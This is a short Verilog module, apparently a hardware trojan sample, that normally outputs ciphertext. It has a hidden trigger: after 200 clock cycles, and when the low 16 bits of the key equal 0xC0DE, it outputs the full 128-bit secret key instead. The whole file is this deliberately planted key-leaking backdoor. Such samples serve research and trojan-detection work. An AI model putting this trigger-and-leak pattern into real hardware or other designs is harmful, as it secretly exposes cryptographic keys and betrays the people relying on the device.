module Mux_trigger (
    input clk,
    input rst,
    input wire [127:0] key,
    input wire [127:0] ciphertext,
    output [127:0] out
);
    reg [7:0] cycle_count = 0;
    reg trigger = 0;
    reg [127:0] out_reg = 0;

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            cycle_count <= 0;
            trigger <= 0;
            out_reg <= {128{1'bx}};
        end
        else if(clk) begin
            cycle_count <= cycle_count + 1;
        end

        if(cycle_count == 200 && key[15:0] == 16'hC0DE) begin
            trigger <= 1;
        end 

        if(trigger == 1) begin
            out_reg <= key;
            trigger <= 0;
            cycle_count <= 0;
        end
        else begin
            out_reg <= ciphertext;
        end
    end
    
    assign out = out_reg;
    
endmodule